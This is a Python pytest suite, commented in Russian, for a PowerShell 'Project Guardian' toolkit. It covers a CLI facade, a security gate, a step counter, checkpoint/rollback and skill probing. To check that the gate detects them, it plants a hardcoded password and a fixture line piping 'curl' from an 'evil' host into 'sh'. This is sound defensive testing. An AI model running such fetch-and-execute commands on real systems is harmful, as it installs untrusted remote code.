import glob
import json
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = REPO_ROOT / "scripts"
PY = sys.executable


def run_ps(script: Path, *args, cwd=None):
    """Запуск PowerShell-скрипта с перехватом stdout/stderr."""
    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(script)] + [str(a) for a in args]
    return subprocess.run(
        cmd,
        cwd=str(cwd or REPO_ROOT),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="utf-8",
        errors="replace",
    )


# ---------------------------------------------------------------------------
# CLI-фасад
# ---------------------------------------------------------------------------

def test_guardian_root_help():
    p = REPO_ROOT / "guardian.ps1"
    assert p.exists()
    res = run_ps(p, "--help")
    assert res.returncode == 0
    assert "Project Guardian v2." in res.stdout
    assert "checkpoint" in res.stdout
    assert "doctor" in res.stdout
    assert "steps" in res.stdout


def test_guardian_scripts_help():
    p = SCRIPTS / "guardian.ps1"
    assert p.exists()
    res = run_ps(p, "-h")
    assert res.returncode == 0
    assert "Project Guardian v2." in res.stdout


def test_guardian_no_args():
    p = REPO_ROOT / "guardian.ps1"
    res = run_ps(p)
    assert res.returncode == 0
    assert "Использование: guardian.ps1" in res.stdout


def test_guardian_unknown_command():
    p = REPO_ROOT / "guardian.ps1"
    res = run_ps(p, "unknown_command_404")
    assert res.returncode == 1
    assert "Неизвестная команда Guardian" in res.stdout


def test_root_facade_is_thin_shim():
    """Корневой фасад не должен дублировать логику scripts/guardian.ps1 (дрейф двух копий)."""
    root = REPO_ROOT / "guardian.ps1"
    text = root.read_text(encoding="utf-8-sig")
    assert len(text.splitlines()) < 40, "корневой guardian.ps1 разросся: логика должна жить только в scripts/"
    assert "scripts\\guardian.ps1" in text
    assert "CommandMap" not in text, "в корневом шиме не должно быть своей таблицы команд"

    root_help = run_ps(root, "--help").stdout
    scripts_help = run_ps(SCRIPTS / "guardian.ps1", "--help").stdout
    assert root_help == scripts_help


# ---------------------------------------------------------------------------
# Security Gate: он должен не только пропускать, но и валить
# ---------------------------------------------------------------------------

def make_project(tmp_path: Path) -> Path:
    p = tmp_path / "proj"
    p.mkdir()
    return p


def secret_line(secret: str) -> str:
    """Собираем литерал секрета на лету: иначе сам тест валит security-gate (SEC-002)."""
    return 'password = "' + secret + '"'


def write_bom(path: Path, text: str):
    path.write_bytes(b"\xef\xbb\xbf" + text.encode("utf-8"))


def test_gate_passes_on_this_repo():
    res = run_ps(SCRIPTS / "security-gate.ps1")
    assert res.returncode == 0, res.stdout
    assert "SECURITY GATE PASSED" in res.stdout


def test_gate_detects_planted_secret(tmp_path):
    proj = make_project(tmp_path)
    (proj / "bad.py").write_text(secret_line("SuperSecret123") + "\n", encoding="utf-8")
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert res.returncode == 1
    assert "SEC-002" in res.stdout
    assert "SECURITY GATE FAILED" in res.stdout


def test_gate_detects_curl_pipe_sh(tmp_path):
    proj = make_project(tmp_path)
    (proj / "install.sh").write_text("curl -fsSL https://evil/x.sh | sh\n", encoding="utf-8")
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert res.returncode == 1
    assert "SEC-010" in res.stdout


def test_gate_detects_test_path_without_literalpath(tmp_path):
    """Регрессия #16: Test-Path без -LiteralPath обязан валить гейт (PS-001)."""
    proj = make_project(tmp_path)
    write_bom(proj / "bad.ps1", 'if (Test-Path $p) { "x" }\n')
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert res.returncode == 1
    assert "PS-001" in res.stdout


def test_gate_accepts_test_path_with_literalpath(tmp_path):
    proj = make_project(tmp_path)
    write_bom(proj / "ok.ps1", 'if (Test-Path -LiteralPath $p) { "x" }\n')
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert "PS-001" not in res.stdout


def test_gate_detects_ps1_without_bom(tmp_path):
    """PowerShell 5.1 читает .ps1 без BOM как ANSI: кириллица ломает парсер."""
    proj = make_project(tmp_path)
    (proj / "nobom.ps1").write_text('Write-Host "Привет"\n', encoding="utf-8")
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert res.returncode == 1
    assert "bom: nobom.ps1" in res.stdout


def test_gate_allowlist_strict_entry_is_narrow(tmp_path):
    """Строгая запись привязана к правилу, файлу и строке — остальные строки не прикрывает."""
    proj = make_project(tmp_path)
    (proj / "a.py").write_text('x = 1\n' + secret_line("RealSecret42") + "\n", encoding="utf-8")
    (proj / ".security-gate-allow").write_text(
        "SEC-002 a.py:1  # прикрыта только первая строка\n", encoding="utf-8"
    )
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert res.returncode == 1, "исключение закрыло строку, которую не должно было закрывать"
    assert "a.py:2" in res.stdout


def test_gate_allowlist_strict_entry_excuses_target_line(tmp_path):
    proj = make_project(tmp_path)
    (proj / "a.py").write_text(secret_line("RealSecret42") + "\n", encoding="utf-8")
    (proj / ".security-gate-allow").write_text(
        "SEC-002 a.py:1  # тестовая фикстура\n", encoding="utf-8"
    )
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert res.returncode == 0, res.stdout
    assert "1 excused" in res.stdout


def test_gate_allowlist_legacy_entry_warns(tmp_path):
    """Устаревший подстрочный формат поддерживается, но гейт обязан предупредить."""
    proj = make_project(tmp_path)
    (proj / "a.py").write_text(secret_line("LegacySecret") + "\n", encoding="utf-8")
    (proj / ".security-gate-allow").write_text("LegacySecret  # старый формат\n", encoding="utf-8")
    res = run_ps(SCRIPTS / "security-gate.ps1", "-ProjectPath", proj)
    assert res.returncode == 0
    assert "устаревшая запись" in res.stdout


def test_repo_allowlist_uses_strict_format():
    """В самом репозитории не должно остаться подстрочных исключений."""
    allow = REPO_ROOT / ".security-gate-allow"
    if not allow.exists():
        pytest.skip("нет .security-gate-allow")
    for line in allow.read_text(encoding="utf-8").splitlines():
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        assert re.match(r"^[A-Z]{2,4}-\d{3}\s+\S+.*#\s*\S", s), f"нестрогая запись: {s}"


# ---------------------------------------------------------------------------
# Счетчик шагов: шаги, а не строки лога
# ---------------------------------------------------------------------------

def make_transcript(path: Path, steps: int, padding: int):
    rows = [
        json.dumps({"step_index": i, "source": "MODEL", "type": "GENERIC", "content": "x" * 20})
        for i in range(steps)
    ]
    rows += [json.dumps({"source": "SYSTEM", "type": "SYSTEM_MESSAGE", "content": "pad"})] * padding
    path.write_text("\n".join(rows) + "\n", encoding="utf-8")
    return len(rows)


def test_step_counter_counts_steps_not_lines(tmp_path):
    t = tmp_path / "transcript.jsonl"
    lines = make_transcript(t, steps=10, padding=90)
    assert lines == 100
    res = run_ps(SCRIPTS / "session-steps.ps1", "-TranscriptPath", t)
    assert res.returncode == 0
    assert "10" in res.stdout
    assert "100" not in res.stdout, "счетчик снова считает строки лога вместо шагов"


def test_step_counter_threshold_exit_code(tmp_path):
    t = tmp_path / "transcript.jsonl"
    make_transcript(t, steps=10, padding=0)
    ok = run_ps(SCRIPTS / "session-steps.ps1", "-TranscriptPath", t, "-Threshold", 180)
    assert ok.returncode == 0
    over = run_ps(SCRIPTS / "session-steps.ps1", "-TranscriptPath", t, "-Threshold", 5)
    assert over.returncode == 1


def test_step_counter_silent_when_session_unknown():
    """Нет ID и нет лога проекта — счетчик молчит, а не выбирает чужую сессию."""
    res = run_ps(
        SCRIPTS / "session-steps.ps1",
        "-ConversationId", "00000000-0000-0000-0000-000000000000",
        "-ProjectPath", "C:\\__no_such_project__",
    )
    assert res.returncode == 0
    assert "Сессия не определена" in res.stdout
    assert "STEP COUNTER" not in res.stdout


def test_steps_via_facade(tmp_path):
    t = tmp_path / "transcript.jsonl"
    make_transcript(t, steps=7, padding=0)
    res = run_ps(REPO_ROOT / "guardian.ps1", "steps", "-TranscriptPath", t)
    assert res.returncode == 0
    assert "7" in res.stdout


# ---------------------------------------------------------------------------
# Аудит обвязки: должен уметь говорить "нет"
# ---------------------------------------------------------------------------

def test_guardian_harness_audit():
    res = run_ps(REPO_ROOT / "guardian.ps1", "harness")
    assert res.returncode == 0, res.stdout
    assert "8 Измерений Обвязки" in res.stdout
    assert "System Prompts" in res.stdout
    assert "Guardrails" in res.stdout


def test_harness_reports_blockers(tmp_path):
    """Пустой каталог — это блокеры (нет памяти, нет гейта), а не '8/8 в норме'."""
    empty = tmp_path / "empty"
    empty.mkdir()
    res = run_ps(SCRIPTS / "audit-harness.ps1", "-ProjectPath", empty)
    assert res.returncode == 1
    assert "блокер" in res.stdout.lower()


# ---------------------------------------------------------------------------
# Probe Gate
# ---------------------------------------------------------------------------

def test_guardian_probe_self():
    res = run_ps(REPO_ROOT / "guardian.ps1", "probe", "-SkillPath", REPO_ROOT)
    assert res.returncode == 0
    assert "PROBE PASSED" in res.stdout


def test_guardian_probe_invalid_dir(tmp_path):
    empty_dir = tmp_path / "fake_skill"
    empty_dir.mkdir()
    res = run_ps(REPO_ROOT / "guardian.ps1", "probe", "-SkillPath", empty_dir)
    assert res.returncode == 1
    assert "PROBE FAILED" in res.stdout


def test_install_skill_calls_probe_gate():
    """Probe Gate обязан вызываться до копирования скилла (иначе битый скилл установится)."""
    text = (SCRIPTS / "install-skill.ps1").read_text(encoding="utf-8-sig")
    assert "probe-skill.ps1" in text
    assert "PROBE FAILED" in text or "Probe" in text


# ---------------------------------------------------------------------------
# Рекомендации
# ---------------------------------------------------------------------------

def test_guardian_recommend_no_target_fails():
    res = run_ps(REPO_ROOT / "guardian.ps1", "recommend", "-Title", "Test Recommendation Without Target")
    assert res.returncode == 1
    assert "Не указан адресат рекомендации" in res.stdout


# ---------------------------------------------------------------------------
# Checkpoint -> Rollback: сквозной сценарий на реальных файлах
# ---------------------------------------------------------------------------

def test_checkpoint_and_rollback_roundtrip(tmp_path):
    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "app.py").write_text("print(1)\n", encoding="utf-8")

    cp = run_ps(SCRIPTS / "checkpoint.ps1", "-ProjectPath", proj, "-Message", "test roundtrip", "-NoGraphify")
    assert cp.returncode == 0, cp.stdout

    backups = sorted(glob.glob(str(proj / ".backups" / "checkpoint_*")))
    assert backups, "checkpoint не создал резервную копию"

    (proj / "app.py").write_text("print('broken')\n", encoding="utf-8")
    cp_name = Path(backups[-1]).name

    rb = run_ps(SCRIPTS / "rollback.ps1", "-ProjectPath", proj, "-TargetCheckpoint", cp_name)
    assert rb.returncode == 0, rb.stdout
    assert (proj / "app.py").read_text(encoding="utf-8").strip() == "print(1)"
